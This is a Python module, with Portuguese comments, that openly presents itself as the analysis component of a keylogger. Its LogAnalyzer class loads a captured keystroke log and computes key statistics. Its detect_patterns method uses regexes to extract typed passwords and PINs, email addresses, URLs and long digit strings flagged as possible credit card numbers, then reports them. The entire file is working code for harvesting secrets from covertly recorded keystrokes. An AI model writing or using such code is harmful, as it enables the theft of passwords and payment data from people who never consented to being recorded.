"""
Módulo Analyzer - Análise de dados capturados

Classes:
    LogAnalyzer: Análise de arquivos de log
"""

from collections import Counter, defaultdict
from datetime import datetime
from typing import Dict, List, Tuple, Any
import json
import re


class LogAnalyzer:
    """
    Analisador de logs de keylogger.
    
    Fornece ferramentas para análise de dados capturados.
    
    Example:
        >>> analyzer = LogAnalyzer("keys.log")
        >>> stats = analyzer.get_statistics()
        >>> analyzer.export_report("relatorio.json")
    """
    
    def __init__(self, log_file: str = "keys.log"):
        """
        Inicializa o analisador.
        
        Args:
            log_file: Caminho do arquivo de log
        """
        self.log_file = log_file
        self.data = self._load_file()
    
    def _load_file(self) -> str:
        """Carrega conteúdo do arquivo."""
        try:
            with open(self.log_file, 'r', encoding='utf-8') as f:
                return f.read()
        except FileNotFoundError:
            raise FileNotFoundError(f"Arquivo {self.log_file} não encontrado")
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Gera estatísticas gerais do log.
        
        Returns:
            Dicionário com estatísticas
        """
        return {
            "total_characters": len(self.data),
            "total_lines": self.data.count('\n'),
            "total_spaces": self.data.count(' '),
            "timestamp": datetime.now().isoformat()
        }
    
    def get_most_common_keys(self, top_n: int = 10) -> List[Tuple[str, int]]:
        """
        Retorna as teclas mais digitadas.
        
        Args:
            top_n: Número de top teclas
            
        Returns:
            Lista de tuplas (tecla, frequência)
        """
        counter = Counter(self.data)
        return counter.most_common(top_n)
    
    def detect_patterns(self) -> Dict[str, List[str]]:
        """
        Detecta padrões suspeitos.
        
        Returns:
            Dicionário com padrões encontrados
        """
        patterns = {
            "passwords": [],
            "emails": [],
            "urls": [],
            "numbers": []
        }
        
        # Detectar senhas
        password_patterns = [
            r"password[\s=:]+\S+",
            r"senha[\s=:]+\S+",
            r"pin[\s=:]+\d{4,}"
        ]
        for pattern in password_patterns:
            matches = re.findall(pattern, self.data, re.IGNORECASE)
            patterns["passwords"].extend(matches)
        
        # Detectar emails
        email_pattern = r"[\w\.-]+@[\w\.-]+\.\w+"
        patterns["emails"] = re.findall(email_pattern, self.data)
        
        # Detectar URLs
        url_pattern = r"https?://[\w\.-]+"
        patterns["urls"] = re.findall(url_pattern, self.data)
        
        # Detectar números longos (possível cartão de crédito)
        number_pattern = r"\b\d{13,19}\b"
        patterns["numbers"] = re.findall(number_pattern, self.data)
        
        return patterns
    
    def get_frequency_analysis(self) -> Dict[str, float]:
        """
        Análise de frequência (frequência relativa).
        
        Returns:
            Dicionário com frequências percentuais
        """
        counter = Counter(self.data)
        total = len(self.data)
        
        return {
            char: (count / total) * 100
            for char, count in counter.most_common(20)
        }
    
    def export_report(self, output_file: str = "relatorio.json") -> None:
        """
        Exporta relatório de análise.
        
        Args:
            output_file: Arquivo de saída
        """
        report = {
            "timestamp": datetime.now().isoformat(),
            "log_file": self.log_file,
            "statistics": self.get_statistics(),
            "top_10_keys": dict(self.get_most_common_keys(10)),
            "patterns": self.detect_patterns(),
            "frequency": self.get_frequency_analysis()
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"✅ Relatório salvo em: {output_file}")
    
    def print_summary(self) -> None:
        """Imprime resumo da análise."""
        stats = self.get_statistics()
        patterns = self.detect_patterns()
        top_keys = self.get_most_common_keys(5)
        
        print("\n" + "="*60)
        print("📊 ANÁLISE DO LOG")
        print("="*60)
        
        print(f"\n📈 ESTATÍSTICAS:")
        print(f"  Total de caracteres: {stats['total_characters']}")
        print(f"  Total de linhas: {stats['total_lines']}")
        print(f"  Espaços digitados: {stats['total_spaces']}")
        
        print(f"\n🔝 TECLAS MAIS FREQUENTES:")
        for char, freq in top_keys:
            if char not in ['\n', '\r']:
                print(f"  '{char}': {freq}x")
        
        print(f"\n⚠️ PADRÕES DETECTADOS:")
        if patterns['passwords']:
            print(f"  Possíveis senhas: {len(patterns['passwords'])}")
        if patterns['emails']:
            print(f"  Emails: {patterns['emails']}")
        if patterns['urls']:
            print(f"  URLs: {patterns['urls']}")
        if patterns['numbers']:
            print(f"  Números longos: {len(patterns['numbers'])}")
        
        print("\n" + "="*60)
